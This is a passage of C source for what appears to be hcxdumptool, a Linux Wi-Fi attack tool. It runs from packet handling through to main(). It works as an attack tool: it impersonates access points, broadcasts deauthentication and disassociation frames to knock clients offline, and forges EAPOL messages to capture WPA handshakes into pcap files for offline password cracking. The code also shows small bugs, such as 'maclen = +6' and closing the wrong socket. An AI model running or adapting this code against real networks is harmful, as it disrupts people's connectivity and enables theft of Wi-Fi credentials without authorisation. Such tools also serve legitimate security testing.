static macl_t *zeiger;
static int c;

zeiger = proberesponseliste;
for(c = 0; c < PROBERESPONSELISTESIZEMAX -1; c++)
	{
	if(memcmp(&mac_null, zeiger->mac_addr, 6) == 0)
		{
		break;
		}
	if(memcmp(mac_ap, zeiger->mac_addr, 6) == 0)
		{
		zeiger->tv_sec = tv.tv_sec;
		return true;
		}
	zeiger++;
	}
zeiger->tv_sec = tv.tv_sec;
memcpy(zeiger->mac_addr, mac_ap, 6);
qsort(proberesponseliste, PROBERESPONSELISTESIZEMAX, MACLIST_SIZE, sort_maclist_by_time);
return false;
}
/*===========================================================================*/
static inline bool handleproberequest(uint8_t *macframe, int maclen)
{
static mac_t *macf;
static ietag_t *ietagf;
static macessidl_t *zeiger;
static int c;

macf = (mac_t*)macframe;
ietagf = (ietag_t*)&macframe[maclen];
if(ietagf->id != TAG_SSID)
	{
	return true;
	}
if(ietagf->len == 0)
	{
	return true;
	}
if(ietagf->len > 32)
	{
	return true;
	}
if(ietagf->data[1] == 0)
	{
	return true;
	}

if(memcmp(&mac_broadcast, macf->addr1, 6) != 0)
	{
	send_proberesponse(macf->addr2, macf->addr1, ietagf);
	zeiger = proberequestliste;
	for(c = 0; c < PROBEREQUESTLISTESIZEMAX -1; c++)
		{
		if(memcmp(&mac_null, zeiger->mac_addr, 6) == 0)
			{
			break;
			}
		if((memcmp(macf->addr1, zeiger->mac_addr, 6) == 0) && (zeiger->essid_len == ietagf->len) && (memcmp(zeiger->essid, ietagf->data, ietagf->len) == 0))
			{
			zeiger->tv_sec = tv.tv_sec;
			return true;
			}
		zeiger++;
		}
	zeiger->tv_sec = tv.tv_sec;
	memcpy(zeiger->mac_addr, macf->addr1, 6);
	zeiger->essid_len = ietagf->len;
	memcpy(zeiger->essid, ietagf->data, ietagf->len);
	qsort(proberequestliste, PROBEREQUESTLISTESIZEMAX, MACESSIDLIST_SIZE, sort_macessidlist_by_time);
	return false;
	}

zeiger = proberequestliste;
for(c = 0; c < PROBEREQUESTLISTESIZEMAX -1; c++)
	{
	if(memcmp(&mac_null, zeiger->mac_addr, 6) == 0)
		{
		break;
		}
	if((zeiger->essid_len == ietagf->len) && (memcmp(zeiger->essid, ietagf->data, ietagf->len) == 0))
		{
		send_proberesponse(macf->addr2, zeiger->mac_addr, ietagf);
		zeiger->tv_sec = tv.tv_sec;
		return true;
		}
	zeiger++;
	}
zeiger->tv_sec = tv.tv_sec;
mac_myap[5] = mynicap & 0xff;
mac_myap[4] = (mynicap >> 8) & 0xff;
mac_myap[3] = (mynicap >> 16) & 0xff;
memcpy(zeiger->mac_addr, &mac_myap, 6);
send_proberesponse(macf->addr2, zeiger->mac_addr, ietagf);
mynicap++;
zeiger->essid_len = ietagf->len;
memcpy(zeiger->essid, ietagf->data, ietagf->len);
qsort(proberequestliste, PROBEREQUESTLISTESIZEMAX, MACESSIDLIST_SIZE, sort_macessidlist_by_time);
return false;
}
/*===========================================================================*/
static bool set_channel()
{
static struct iwreq pwrq;

memset(&pwrq, 0, sizeof(pwrq));
strncpy(pwrq.ifr_name, interfacename, IFNAMSIZ);
pwrq.u.freq.e = 0;
pwrq.u.freq.flags = IW_FREQ_FIXED;
pwrq.u.freq.m = channellist[cpa];
if(ioctl(fd_main, SIOCSIWFREQ, &pwrq) == -1)
	{
	return false;
	}
return true;
}
/*===========================================================================*/
__attribute__ ((noreturn))
static void processpackets()
{
#ifdef DOGPIOSUPPORT
static int c;
#endif
static int pklen;
static pcaprec_hdr_t *packetsave;
static rth_t *rth;
static int rthlen;
static int maclen;
static mac_t *macf;
static authf_t* authenticationreqf;
static llc_t *llcf;
static eapauth_t *eapauthf;
static wpakey_t* wpakeyf;
static ipv4_t *ipv4f;
static ipv6_t *ipv6f;
static int mk;
static unsigned long long int rc;
static int last_status;

static uint8_t packetin[PCAP_SNAPLEN];
static uint8_t last_mac_sta[6];
static uint8_t last_mac_ap[6];
static uint8_t last_beacon_mac_ap[6];

char timestring[16];

#ifdef DOGPIOSUPPORT
if(wiringPiSetup() == -1)
	{
	puts ("wiringPi failed!");
	programmende(SIGINT);
	}

pinMode(0, OUTPUT);
pinMode(7, INPUT);

for (c = 0; c < 5; c++)
	{
	digitalWrite(0 , HIGH);
	delay (200);
	digitalWrite(0, LOW);
	delay (200);
	}
#endif

memset(&last_mac_sta, 0 ,6);
memset(&last_mac_ap, 0 ,6);
last_status = 0;
packetsave = (pcaprec_hdr_t*)packetin;
printf("\e[?25l\nstart capturing (stop with ctrl+c)\n"
	"interface: %s\n"
	"mac_ap...: %06x%06x\n"
	"mac_sta..: %06x%06x\n\n",
	interfacename, myouiap, mynicap, myouista, mynicsta);
send_undirected_proberequest();
while(1)
	{
	if(showstatusflag == true)
		{
		printf("channel: % 3d, received packets: %llu, internal errors: %d             \r", channellist[cpa], packetcount, errorcount);
		showstatusflag = false;
		}
	pklen = read(fd_out, &packetin[PCAPREC_SIZE], PCAP_SNAPLEN-PCAPREC_SIZE);
	if(pklen < (int)RTH_SIZE)
		{
		errorcount++;
		continue;
		}
	gettimeofday(&tv, NULL);
	packetsave->ts_sec = tv.tv_sec;
	packetsave->ts_usec = tv.tv_usec;
	packetsave->incl_len = pklen;
	packetsave->orig_len = pklen;
	packetcount++;
	rth = (rth_t*)&packetin[PCAPREC_SIZE];
	rthlen = le16toh(rth->it_len);
	macf = (mac_t*)&packetin[PCAPREC_SIZE +rthlen];
	maclen = MAC_SIZE_NORM;
	if(macf->type == IEEE80211_FTYPE_CTL)
		{
		if (macf->subtype == IEEE80211_STYPE_RTS)
			maclen = MAC_SIZE_RTS;
		else
			{
			if (macf->subtype == IEEE80211_STYPE_ACK)
				maclen = MAC_SIZE_ACK;
			}
		}
	 else
		{
		if(macf->type == IEEE80211_FTYPE_DATA)
			{
			if (macf->subtype & IEEE80211_STYPE_QOS_DATA)
				{
				maclen += QOS_SIZE;
				}
			}
		}
	if((macf->to_ds == 1) && (macf->from_ds == 1))
		{
		maclen = +6;
		}
	if(pklen < ((int)RTH_SIZE + maclen))
		{
		continue;
		}
	/* check management frames */
	if(macf->type == IEEE80211_FTYPE_MGMT)
		{
		if(macf->subtype == IEEE80211_STYPE_BEACON)
			{
			if(memcmp(last_beacon_mac_ap, macf->addr2, 6) != 0)
				{
				send_deauthentication(IEEE80211_STYPE_DEAUTH, WLAN_REASON_UNSPECIFIED, mac_broadcast, macf->addr2, macf->addr2);
				memcpy(&last_beacon_mac_ap, macf->addr2, 6);
				}
			else
				{
				memset(&last_beacon_mac_ap, 0, 6);
				}
			continue;
			}
		else if(macf->subtype == IEEE80211_STYPE_PROBE_REQ)
			{
			if(handleproberequest(&packetin[PCAPREC_SIZE +rthlen], maclen) == false)
				{
				write(fd_pcap, packetsave, pklen + PCAPREC_SIZE);
				}
			continue;
			}
		else if(macf->subtype == IEEE80211_STYPE_PROBE_RESP)
			{
			if(memcmp(mac_mysta, macf->addr1, 6) == 0)
				{
				send_deauthentication(IEEE80211_STYPE_DEAUTH, WLAN_REASON_PREV_AUTH_NOT_VALID, mac_broadcast, macf->addr2, macf->addr2);
				}
			if(handleproberesponse(macf->addr2) == false)
				{
				write(fd_pcap, packetsave, pklen + PCAPREC_SIZE);
				}
			continue;
			}
		else if(macf->subtype == IEEE80211_STYPE_AUTH)
			{
			authenticationreqf = (authf_t*)&packetin[PCAPREC_SIZE +rthlen +maclen];
			if(authenticationreqf->authentication_seq == 1)
				{
				send_acknowledgement(macf->addr2);
				send_authenticationresponse(macf->addr2, macf->addr1);
				}
			continue;
			}
		else if(macf->subtype == IEEE80211_STYPE_ASSOC_REQ)
			{ 
			send_acknowledgement(macf->addr2);
			write(fd_pcap, packetsave, pklen + PCAPREC_SIZE);
			send_associationresponse(macf->addr2, macf->addr1);
			if((memcmp(&last_mac_sta, macf->addr2, 6) == 0) && (memcmp(&last_mac_ap, macf->addr1, 6) == 0))
				{
				last_status |= STATUS_ASSOCIATED;
				continue;
				}
			memcpy(&last_mac_sta, macf->addr2, 6);
			memcpy(&last_mac_ap, macf->addr1, 6);
			last_status = STATUS_ASSOCIATED;
			continue;
			}
		else if(macf->subtype == IEEE80211_STYPE_ASSOC_RESP)
			{
			write(fd_pcap, packetsave, pklen + PCAPREC_SIZE);
			continue;
			}
		else if(macf->subtype == IEEE80211_STYPE_REASSOC_REQ)
			{
			write(fd_pcap, packetsave, pklen + PCAPREC_SIZE);
			send_deauthentication(IEEE80211_STYPE_DEAUTH, WLAN_REASON_STA_REQ_ASSOC_WITHOUT_AUTH, macf->addr2, macf->addr1, macf->addr1);
			continue;
			}
		else if(macf->subtype == IEEE80211_STYPE_REASSOC_RESP)
			{
			write(fd_pcap, packetsave, pklen + PCAPREC_SIZE);
			send_deauthentication(IEEE80211_STYPE_DEAUTH, WLAN_REASON_DEAUTH_LEAVING, macf->addr2, macf->addr1, macf->addr2);
			continue;
			}
		else if(macf->subtype == IEEE80211_STYPE_ACTION)
			{
			continue;
			}
		continue;
		}
	else if(macf->type == IEEE80211_FTYPE_CTL)
		{
		if(macf->subtype == IEEE80211_STYPE_ACK)
			{
			if(memcmp(&last_mac_ap, macf->addr1, 6) == 0)
				{
				if(last_status == STATUS_ASSOCIATED)
					{
					send_m1(last_mac_sta, last_mac_ap);
					}
				else if((last_status & STATUS_M1) == STATUS_M1)
					{
					send_actionrequest(last_mac_sta, last_mac_ap);
					}
				}
			continue;
			}
		continue;
		}
	else if(macf->type == IEEE80211_FTYPE_DATA)
		{
		if((macf->subtype == IEEE80211_STYPE_NULLFUNC) || (macf->subtype == IEEE80211_STYPE_QOS_NULLFUNC))
			{
			if(macf->power == 1)
				{
				continue;
				}
			if((memcmp(&last_mac_sta, macf->addr2, 6) == 0) && (memcmp(&last_mac_ap, macf->addr1, 6) == 0))
				{
				send_acknowledgement(last_mac_sta);
				}
			else
				{
				send_deauthentication(IEEE80211_STYPE_DEAUTH, WLAN_REASON_PREV_AUTH_NOT_VALID, macf->addr2, macf->addr1, macf->addr1);
				}
			continue;
			}
		else if((macf->subtype == IEEE80211_STYPE_DATA) || (macf->subtype == IEEE80211_STYPE_QOS_DATA))
			{
			if(pklen < ((int)RTH_SIZE +maclen +(int)LLC_SIZE))
				{
				continue;
				}
			llcf = (llc_t*)&packetin[PCAPREC_SIZE +rthlen +maclen];
			if(ntohs(llcf->type) == LLC_TYPE_AUTH)
				{
				eapauthf = (eapauth_t*)&packetin[PCAPREC_SIZE +rthlen +maclen +LLC_SIZE];
				if(eapauthf->type == 3)
					{
					write(fd_pcap, packetsave, pklen +PCAPREC_SIZE);
					wpakeyf = (wpakey_t*)&packetin[PCAPREC_SIZE +rthlen +maclen +LLC_SIZE +EAPAUTH_SIZE];
					mk = (getkeyinfo(ntohs(wpakeyf->keyinfo)));
					rc = be64toh(wpakeyf->replaycount);
					if((mk == WPA_M1) && (rc != MYREPLAYCOUNT))
						{
						send_m1_org(macf->addr1, macf->addr2, wpakeyf);
						}
					else if((mk == WPA_M1) && (rc == MYREPLAYCOUNT))
						{
						if((memcmp(&last_mac_sta, macf->addr2, 6) == 0) && (memcmp(&last_mac_ap, macf->addr1, 6) == 0))
							{
							last_status |= STATUS_M1;
							}
						}
					else if((mk == WPA_M2) && (rc == MYREPLAYCOUNT))
						{
						send_acknowledgement(macf->addr2);
						memset(&last_mac_sta, 0 ,6);
						memset(&last_mac_ap, 0 ,6);
						last_status = 0;
						if((addhandshake(macf->addr2, macf->addr1) == false) && (wantstatusflag == true))
							{
							strftime(timestring, 16, "%H:%M:%S", localtime(&tv.tv_sec));
							if(macf->retry == 0)
								{
								printf("[%s] %02x%02x%02x%02x%02x%02x <-> %02x%02x%02x%02x%02x%02x handshake                \n",
								timestring,
								macf->addr1[0], macf->addr1[1], macf->addr1[2], macf->addr1[3], macf->addr1[4], macf->addr1[5],
								macf->addr2[0], macf->addr2[1], macf->addr2[2], macf->addr2[3], macf->addr2[4], macf->addr2[5]);
								}
							else
								{
								printf("[%s] %02x%02x%02x%02x%02x%02x <-> %02x%02x%02x%02x%02x%02x handshake (retransmitted)\n",
								timestring,
								macf->addr1[0], macf->addr1[1], macf->addr1[2], macf->addr1[3], macf->addr1[4], macf->addr1[5],
								macf->addr2[0], macf->addr2[1], macf->addr2[2], macf->addr2[3], macf->addr2[4], macf->addr2[5]);
								}
							}
						}
					else if(mk == WPA_M4)
						{
						send_deauthentication(IEEE80211_STYPE_DISASSOC, WLAN_REASON_DISASSOC_AP_BUSY, macf->addr2, macf->addr1, macf->addr1);
						}
					continue;
					}
				else if(eapauthf->type == 0)
					{
					write(fd_pcap, packetsave, pklen + PCAPREC_SIZE);
					continue;
					}
				else if(eapauthf->type == 1)
					{
					send_acknowledgement(macf->addr2);
					send_requestidentity(macf->addr2, macf->addr1);
					}
				}
			else if(ntohs(llcf->type) == LLC_TYPE_IPV4)
				{
				ipv4f = (ipv4_t*)&packetin[PCAPREC_SIZE +rthlen +maclen +LLC_SIZE];
				if((ipv4v6flag == true) || (ipv4f->nextprotocol == NEXTHDR_GRE) || (ipv4f->nextprotocol == NEXTHDR_ESP) || (ipv4f->nextprotocol == NEXTHDR_AUTH))
					{
					write(fd_pcap, packetsave, pklen + PCAPREC_SIZE);
					}
				continue;
				}
			else if(ntohs(llcf->type) == LLC_TYPE_IPV6)
				{
				ipv6f = (ipv6_t*)&packetin[PCAPREC_SIZE +rthlen +maclen +LLC_SIZE];
				if((ipv4v6flag == true) || (ipv6f->nextprotocol == NEXTHDR_GRE) || (ipv6f->nextprotocol == NEXTHDR_ESP) || (ipv6f->nextprotocol == NEXTHDR_AUTH))
					{
					write(fd_pcap, packetsave, pklen + PCAPREC_SIZE);
					}
				continue;
				}
			}
		}
	}
}
/*===========================================================================*/
static bool opensockets()
{
struct sockaddr_ll sll;
struct ifreq ifr;
struct packet_mreq mr;

if((fd_main = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
	perror( "socket main failed" );
	return false;
	}
memset(&ifr, 0, sizeof(ifr));
strncpy(ifr.ifr_name, interfacename, IFNAMSIZ);
if(ioctl(fd_main, SIOCGIFINDEX, &ifr) < 0)
	{
	perror( "SIOCGIFINDEX failed" );
	return false;
	}
strncpy(ifr.ifr_name, interfacename, IFNAMSIZ);
if(ioctl(fd_main, SIOCGIFINDEX, &ifr) < 0)
	{
	perror( "SIOCGIFINDEX failed" );
	return false;
	}
memset(&sll, 0, sizeof(sll));
sll.sll_family   = AF_PACKET;
sll.sll_ifindex  = ifr.ifr_ifindex;
sll.sll_protocol = htons(ETH_P_ALL);
if(bind(fd_main,(struct sockaddr*)&sll, sizeof(sll)) < 0)
	{
	perror("bind socket main failed");
	return false;
	}
memset(&mr, 0, sizeof(mr));
mr.mr_ifindex = sll.sll_ifindex;
mr.mr_type    = PACKET_MR_PROMISC;
if(setsockopt(fd_main, SOL_PACKET, PACKET_ADD_MEMBERSHIP, &mr, sizeof(mr)) < 0)
	{
	perror( "setsockopt(PACKET_MR_PROMISC) failed" );
	return false;
	}

if((fd_in = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
	perror( "socket in failed" );
	return false;
	}
memset(&ifr, 0, sizeof(ifr));
strncpy(ifr.ifr_name, interfacename, IFNAMSIZ);
if(ioctl(fd_in, SIOCGIFINDEX, &ifr) < 0)
	{
	perror( "SIOCGIFINDEX failed" );
	return false;
	}
memset(&sll, 0, sizeof(sll));
sll.sll_family   = AF_PACKET;
sll.sll_ifindex  = ifr.ifr_ifindex;
sll.sll_protocol = htons(ETH_P_ALL);
if(bind(fd_in,(struct sockaddr*)&sll, sizeof(sll)) < 0)
	{
	perror("bind socket main failed");
	return false;
	}
memset(&mr, 0, sizeof(mr));
mr.mr_ifindex = sll.sll_ifindex;
mr.mr_type    = PACKET_MR_PROMISC;
if(setsockopt(fd_in, SOL_PACKET, PACKET_ADD_MEMBERSHIP, &mr, sizeof(mr)) < 0)
	{
	perror( "setsockopt(PACKET_MR_PROMISC) failed" );
	return false;
	}

if((fd_out = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
	perror( "socket out failed" );
	return false;
	}
memset(&ifr, 0, sizeof(ifr));
strncpy(ifr.ifr_name, interfacename, IFNAMSIZ);
if(ioctl(fd_out, SIOCGIFINDEX, &ifr) < 0)
	{
	perror( "SIOCGIFINDEX failed" );
	return false;
	}
memset(&sll, 0, sizeof(sll));
sll.sll_family   = AF_PACKET;
sll.sll_ifindex  = ifr.ifr_ifindex;
sll.sll_protocol = htons(ETH_P_ALL);
if(bind(fd_out,(struct sockaddr*)&sll, sizeof(sll)) < 0)
	{
	perror("bind socket main failed");
	return false;
	}
memset(&mr, 0, sizeof(mr));
mr.mr_ifindex = sll.sll_ifindex;
mr.mr_type    = PACKET_MR_PROMISC;
if(setsockopt(fd_out, SOL_PACKET, PACKET_ADD_MEMBERSHIP, &mr, sizeof(mr)) < 0)
	{
	perror( "setsockopt(PACKET_MR_PROMISC) failed" );
	return false;
	}

return true;
}
/*===========================================================================*/
static void signal_handler(int signo)
{
struct ifreq ifr;

if(signo == TT_SIGUSR1)
	{
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, interfacename, IFNAMSIZ);
	ioctl(fd_out, SIOCGIFFLAGS, &ifr);
		{
		if((ifr.ifr_flags & IFF_UP) != IFF_UP)
			{
			errorcause = 1;
			programmende(SIGTERM);
			}
		}
	if(errorcount > maxerrorcount)
		{
		errorcause = 2;
		programmende(SIGTERM);
		}
	if(wantstatusflag == true)
		{
		showstatusflag = true;
		}
#ifdef DOGPIOSUPPORT
	digitalWrite(0, HIGH);
	delay (25);
	digitalWrite(0, LOW);
	delay (25);
	if(digitalRead(7) == 1)
		{
		digitalWrite(0, HIGH);
		programmende(SIGTERM);
		}
#endif
	return;
	}

if(signo == TT_SIGUSR2)
	{
	cpa++;
	if(channellist[cpa] == 0)
		{
		cpa = 0;
		}
	while(set_channel() == false)
		{
		if(channellist[cpa] == 0)
			{
			errorcount++;
			break;
			}
		cpa++;
		}
	send_undirected_proberequest();
	}
return;
}
/*===========================================================================*/
static inline timer_t create_timer(int signo)
{
timer_t timerid;
struct sigevent se;
se.sigev_notify=SIGEV_SIGNAL;
se.sigev_signo = signo;
if(timer_create(CLOCK_REALTIME, &se, &timerid) == -1)
	{
	return NULL;
	}
return timerid;
}
/*===========================================================================*/
static inline bool set_timer(timer_t timerid, int seconds, long int nanoseconds)
{
struct itimerspec timervals;
timervals.it_value.tv_sec = seconds;
timervals.it_value.tv_nsec = nanoseconds;
timervals.it_interval.tv_sec = seconds;
timervals.it_interval.tv_nsec = nanoseconds;

if(timer_settime(timerid, 0, &timervals, NULL) == -1)
	{
	return false;
	}
return true;
}
/*===========================================================================*/
static inline void install_sighandler(int signo, void(*handler)(int))
{
sigset_t set;
struct sigaction act;

/* Setup the handler */
act.sa_handler = handler;
act.sa_flags = SA_RESTART;
sigaction(signo, &act, 0);

/* Unblock the signal */
sigemptyset(&set);
sigaddset(&set, signo);
sigprocmask(SIG_UNBLOCK, &set, NULL);
return;
}
/*===========================================================================*/

/*===========================================================================*/
static bool globalinit(char *pcapname, char *blacklistname)
{
static int c;
static struct stat statinfo;

static char newpcapoutname[PATH_MAX +2];

setbuf(stdout, NULL);
srand(time(NULL));

if(opensockets() == false)
	{
	return false;
	}

memset(&mac_null, 0, 6);
memset(&mac_broadcast, 0xff, 6);
myouiap = myvendorap[rand() % ((MYVENDORAP_SIZE / sizeof(int)))];
mynicap = rand() & 0xffffff;
mac_myap[5] = mynicap & 0xff;
mac_myap[4] = (mynicap >> 8) & 0xff;
mac_myap[3] = (mynicap >> 16) & 0xff;
mac_myap[2] = myouiap & 0xff;
mac_myap[1] = (myouiap >> 8) & 0xff;
mac_myap[0] = (myouiap >> 16) & 0xff;
myouista = myvendorsta[rand() % ((MYVENDORSTA_SIZE / sizeof(int)))];
mynicsta = rand() & 0xffffff;
mac_mysta[5] = mynicsta & 0xff;
mac_mysta[4] = (mynicsta >> 8) & 0xff;
mac_mysta[3] = (mynicsta >> 16) & 0xff;
mac_mysta[2] = myouista & 0xff;
mac_mysta[1] = (myouista >> 8) & 0xff;
mac_mysta[0] = (myouista >> 16) & 0xff;

memset(mac_black_ap ,0, sizeof(mac_black_ap));

gettimeofday(&tv, NULL);

if((proberequestliste = calloc((PROBEREQUESTLISTESIZEMAX), MACESSIDLIST_SIZE)) == NULL)
	{
	return false;
	}
if((proberesponseliste = calloc((PROBERESPONSELISTESIZEMAX), MACLIST_SIZE)) == NULL)
	{
	return false;
	}
if((handshakeliste = calloc((HANDSHAKELISTESIZEMAX), MACAPSTALIST_SIZE)) == NULL)
	{
	return false;
	}
if(pcapname != NULL)
	{
	c = 0;
	strcpy(newpcapoutname, pcapname);
	while(stat(newpcapoutname, &statinfo) == 0)
		{
		snprintf(newpcapoutname, PATH_MAX, "%s-%d.pcap", pcapname, c);
		c++;
		}
	fd_pcap = hcxopenpcapdump(newpcapoutname);
	if(fd_pcap <= 0)
		{
		fprintf(stderr, "could not create dumpfile %s\n", newpcapoutname);
		return false;
		}
	}

if(blacklistname != NULL)
	{
	readblacklist(blacklistname);
	}

signal(SIGINT, programmende);

timer1 = create_timer(TT_SIGUSR1);
if(timer1 == NULL)
	{
	return false;
	}
timer2 = create_timer(TT_SIGUSR2);
if(timer2 == NULL)
	{
	return false;
	}

install_sighandler(TT_SIGUSR1, signal_handler);
install_sighandler(TT_SIGUSR2, signal_handler);
if(set_timer(timer1, TIME_INTERVAL_1S, TIME_INTERVAL_1NS) == false)
	{
	return false;
	}
if(set_timer(timer2, staytime, TIME_INTERVAL_2NS) == false)
	{
	return false;
	}

if(set_channel() == false)
	{
	printf("failed to set channel\n");
	return false;
	}
return true;
}
/*===========================================================================*/
static bool check_wlaninterface(const char* ifname)
{
int fd_info;
struct iwreq fpwrq;
memset(&fpwrq, 0, sizeof(fpwrq));
strncpy(fpwrq.ifr_name, ifname, IFNAMSIZ);

if((fd_info = socket(AF_INET, SOCK_STREAM, 0)) == -1)
	{
	perror( "socket info failed" );
	return false;
	}

if (ioctl(fd_info, SIOCGIWNAME, &fpwrq) != -1)
	{
	close(fd_main);
	return true;
	}
close(fd_info);
return false;
}
/*===========================================================================*/
static void show_wlaninterfaces()
{
struct ifaddrs *ifaddr=NULL;
struct ifaddrs *ifa = NULL;
struct sockaddr_ll *sfda;
static int i = 0;

if(getifaddrs(&ifaddr) == -1)
	{
	perror("getifaddrs failed ");
	}
else
	{
	printf("suitable wlan interfaces:\n");
	for(ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next)
		{
		if((ifa->ifa_addr) && (ifa->ifa_addr->sa_family == AF_PACKET))
			{
			if(check_wlaninterface(ifa->ifa_name) == true)
				{
				sfda = (struct sockaddr_ll*)ifa->ifa_addr;
				printf("%s\t[", ifa->ifa_name);
				for (i=0; i < sfda->sll_halen; i++)
					{
					printf("%02x", (sfda->sll_addr[i]));
					}
				printf("]\n");
				}
			}
		}
	freeifaddrs(ifaddr);
	}
}
/*===========================================================================*/
void processscanlist(char *list)
{
char *ptr;

cpa = 0;
ptr = strtok(list, ",");
while(ptr != NULL)
	{
	channellist[cpa] = atoi(ptr);
	if(channellist[cpa] != 0)
		{
		cpa++;
		}
	if(cpa > 126)
		{
		return;
		}
	ptr = strtok(NULL, ",");
	}
channellist[cpa] = 0;
cpa = 0;
return;
}
/*===========================================================================*/
__attribute__ ((noreturn))
static void version(char *eigenname)
{
printf("%s %s (C) %s ZeroBeat\n", eigenname, VERSION, VERSION_JAHR);
exit(EXIT_SUCCESS);
}
/*---------------------------------------------------------------------------*/
__attribute__ ((noreturn))
static void usage(char *eigenname)
{
printf("%s %s (C) %s ZeroBeat\n"
	"usage:\n"
	"%s <options>\n"
	"\n"
	"options:\n"
	"-i <interface> : interface\n"
	"-o <dump file> : output file in pcapformat including radiotap header (LINKTYPE_IEEE802_11_RADIOTAP)\n"
	"-c <digit>     : set channel (default = channel 1)\n"
	"-C <digit>     : comma separated scanlist (1,3,5,7...)\n"
	"-t <seconds>   : stay time on channel before hopping to the next channel\n"
	"               : default = 5 seconds\n"
	"-B <file>      : blacklist (do not deauthenticate clients from this hosts - format: xxxxxxxxxxxx)\n"
	"-I             : show suitable wlan interfaces and quit\n"
	"-T <maxerrors> : terminate after <xx> maximal errors\n"
	"               : default: 1000000\n"
	"-D             : enable to transmit deauthentication- and disassociation-frames\n"
	"-l             : enable capture of IPv4/IPv6 packets\n"
	"-P             : enable poweroff\n"
	"-s             : enable status messages\n"
	"-h             : show this help\n"
	"-v             : show version\n"
	"\n", eigenname, VERSION, VERSION_JAHR, eigenname);
exit(EXIT_SUCCESS);
}
/*---------------------------------------------------------------------------*/
__attribute__ ((noreturn))
static void usageerror(char *eigenname)
{
printf("%s %s (C) %s by ZeroBeat\n"
	"usage: %s -h for help\n", eigenname, VERSION, VERSION_JAHR, eigenname);
exit(EXIT_FAILURE);
}
/*===========================================================================*/
int main(int argc, char *argv[])
{
static int auswahl;
static int startchannel = 1;
static bool showinterfaces = false;

static char *eigenpfadname, *eigenname;
static char *pcapname = NULL;
static char *blacklistname = NULL;

interfacename = NULL;
eigenpfadname = strdupa(argv[0]);
eigenname = basename(eigenpfadname);

while ((auswahl = getopt(argc, argv, "i:o:c:C:t:B:T:DlPIshvu")) != -1)
	{
	switch (auswahl)
		{
		case 'i':
		interfacename = optarg;
		if(interfacename == NULL)
			{
			fprintf(stderr, "no interface specified\n");
			exit (EXIT_FAILURE);
			}
		break;

		case 'o':
		pcapname = optarg;
		break;

		case 'c':
		startchannel = strtol(optarg, NULL, 10);
		while(channellist[cpa] != 0)
			{
			if(startchannel == channellist[cpa])
				{
				break;
				}
			cpa++;
			}
		if(channellist[cpa] == 0)
			{
			cpa = 0;
			fprintf(stderr, "channel not in scanlist, setting channel to %d\n", channellist[cpa]);
			}
		break;

		case 'C':
		processscanlist(optarg);
		break;


		case 't':
		staytime = strtol(optarg, NULL, 10);
		if(staytime < 0)
			{
			fprintf(stderr, "wrong hoptime\nsetting hoptime to 1\n");
			staytime = TIME_INTERVAL_2S;
			}
		break;

		case 'B':
		blacklistname = optarg;
		break;

		case 'T':
		maxerrorcount = strtol(optarg, NULL, 10);
		break;

		case 'D':
		deauthenticationflag = true;
		break;

		case 'l':
		ipv4v6flag = true;
		break;

		case 'P':
		poweroffflag = true;
		break;

		case 'I':
		showinterfaces = true;
		break;

		case 's':
		wantstatusflag = true;
		break;

		case 'h':
		usage(eigenname);

		case 'v':
		version(eigenname);

		default:
		usageerror(eigenname);
		}
	}

if(showinterfaces == true)
	{
	show_wlaninterfaces();
	return EXIT_SUCCESS;
	}

if(getuid() != 0)
	{
	fprintf(stderr, "this program requires root privileges\n");
	exit(EXIT_FAILURE);
	}

if(interfacename == NULL)
	{
	fprintf(stderr, "no interface selected\n");
	exit(EXIT_FAILURE);
	}

if(globalinit(pcapname, blacklistname) == false)
	{
	fprintf(stderr, "failed to  ‎initialize global lists\n");
	exit(EXIT_FAILURE);
	}

processpackets();

return EXIT_SUCCESS;
}
/*===========================================================================*/
